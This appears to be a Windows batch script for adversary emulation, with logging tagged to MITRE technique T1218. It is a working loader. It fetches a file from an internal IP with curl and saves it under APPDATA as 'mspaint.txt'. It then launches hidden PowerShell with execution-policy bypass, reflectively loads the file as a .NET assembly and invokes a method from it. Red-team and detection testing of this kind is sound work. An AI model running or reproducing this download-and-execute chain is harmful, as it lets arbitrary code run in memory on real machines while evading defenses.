@echo off
SETLOCAL EnableDelayedExpansion

REM ===== PLACEHOLDER CONSTANTS (random-named SET variables) =====
SET a1=%APPDATA%\10956\ca42e0c5
SET b2=mspaint.txt
SET c3=https://10.0.0.49/stage/2/icon.png?10956-7
SET d4=ITZEL-S2B
SET e5=10956
SET f6=7
SET g7=%PUBLIC%\\macula-simulations.log

REM ===== CACHE TIMESTAMP =====
SET tsvar=!DATE! !TIME!

REM ===== INITIALIZE LOGGING =====
echo [!tsvar!][DEBUG][!d4!][!e5!]: script_start>> "!g7!" 2>nul

REM ===== 1. HEARTBEAT FETCH (curl GET) =====
echo [!tsvar!][DEBUG][!d4!][!e5!]: heartbeat_start>> "!g7!" 2>nul
curl -k -s -o "!a1!\!b2!" "!c3!"
set curl_ec=%errorlevel%
echo [!tsvar!][DEBUG][!d4!][!e5!]: heartbeat_complete=!curl_ec!>> "!g7!" 2>nul

REM ===== 2. CHANGE DIRECTORY =====
echo [!tsvar!][DEBUG][!d4!][!e5!]: chdir_start>> "!g7!" 2>nul
cd /d "!a1!" >nul 2>&1
set cd_ec=%errorlevel%
echo [!tsvar!][DEBUG][!d4!][!e5!]: chdir_result=!cd_ec!>> "!g7!" 2>nul

REM ===== 3. INVOKE LOADER VIA POWERSHELL REFLECTION =====
echo [!tsvar!][DEBUG][!d4!][!e5!]: ps_load_start>> "!g7!" 2>nul
powershell.exe -nop -w hidden -ep bypass -Command "& { $a=[Reflection.Assembly]::Load([IO.File]::ReadAllBytes('%APPDATA%\10956\ca42e0c5\mspaint.txt')); ($a.GetExportedTypes()|ForEach-Object {$_.GetMethods([Reflection.BindingFlags]'Public,Static')|Where-Object {$_.GetParameters().Count -eq 0}}|Select -First 1).Invoke($null,$null) }"
set ps_ec=%errorlevel%
echo [!tsvar!][DEBUG][!d4!][!e5!]: ps_load_complete=!ps_ec!>> "!g7!" 2>nul

REM ===== 4. TTP LOGGING =====
if !ps_ec! equ 0 (
    set result=OK
    set errinfo=
) else (
    set result=FAIL
    set errinfo=powershell returned errorlevel !ps_ec!
)
echo [!tsvar!][TTP][!d4!][!e5!]: T1218^|System Binary Proxy Execution=!result!:!errinfo!>> "!g7!" 2>nul

REM ===== CLEANUP =====
echo [!tsvar!][DEBUG][!d4!][!e5!]: script_end>> "!g7!" 2>nul

ENDLOCAL